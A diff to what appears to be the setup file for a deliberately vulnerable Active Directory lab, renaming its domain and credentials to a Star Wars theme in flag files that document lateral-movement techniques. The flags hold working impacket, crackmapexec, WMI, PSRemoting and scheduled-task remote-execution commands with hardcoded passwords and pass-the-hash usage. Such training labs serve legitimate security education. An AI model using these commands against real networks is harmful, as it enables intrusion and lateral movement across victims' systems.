@@ -66,16 +66,16 @@
         LAT-071..074: DCOM/WMI/WinRM Remote Execution
         ================================================
         DCOM ShellBrowserWindow (lateral exec, no PSExec service install):
-          impacket-dcomexec CORP/Administrator:DVADlab2024!@10.10.0.13 "cmd /c whoami"
-          impacket-wmiexec CORP/Administrator:DVADlab2024!@10.10.0.13 "cmd /c whoami"
+          impacket-dcomexec EMPIRE/Administrator:SithLord123!@10.10.0.13 "cmd /c whoami"
+          impacket-wmiexec EMPIRE/Administrator:SithLord123!@10.10.0.13 "cmd /c whoami"
 
         WMI process create:
           Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c whoami" \
-            -ComputerName file01.corp.local -Credential $cred
+            -ComputerName scarif.empire.local -Credential $cred
 
         PSRemoting:
-          Enter-PSSession -ComputerName file01.corp.local -Credential $cred
-          Invoke-Command -ComputerName @('dc01','file01','ws01') -ScriptBlock {whoami}
+          Enter-PSSession -ComputerName scarif.empire.local -Credential $cred
+          Invoke-Command -ComputerName @('coruscant','scarif','tatooine') -ScriptBlock {whoami}
 
     - path: 'C:\Flags\FLAG-LAT-076-RDPHijack.txt'
       content: |
@@ -95,18 +95,18 @@
         LAT-080..085: Service Control Manager Remote Execution
         ========================================================
         impacket-psexec / impacket-smbexec (uses SCM):
-          impacket-psexec CORP/Administrator@10.10.0.13 cmd.exe
-          impacket-smbexec CORP/Administrator:DVADlab2024!@10.10.0.13
+          impacket-psexec EMPIRE/Administrator@10.10.0.13 cmd.exe
+          impacket-smbexec EMPIRE/Administrator:SithLord123!@10.10.0.13
 
         CrackMapExec (covers SMB/WMI/MSSQL/WinRM channels):
-          crackmapexec smb 10.10.0.0/24 -u Administrator -p DVADlab2024! --shares
-          crackmapexec smb 10.10.0.13 -u svc_darryl -H $(hash) -x "net user"
+          crackmapexec smb 10.10.0.0/24 -u Administrator -p SithLord123! --shares
+          crackmapexec smb 10.10.0.13 -u svc_bobafett -H $(hash) -x "net user"
 
     - path: 'C:\Flags\FLAG-LAT-090-AtSched.txt'
       content: |
         LAT-090: Remote Scheduled Task Lateral Movement
         =================================================
-        impacket-atexec CORP/Administrator:DVADlab2024!@10.10.0.13 "cmd /c whoami > C:\output.txt"
+        impacket-atexec EMPIRE/Administrator:SithLord123!@10.10.0.13 "cmd /c whoami > C:\output.txt"
 
         PowerShell at:
           $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c $(payload)"
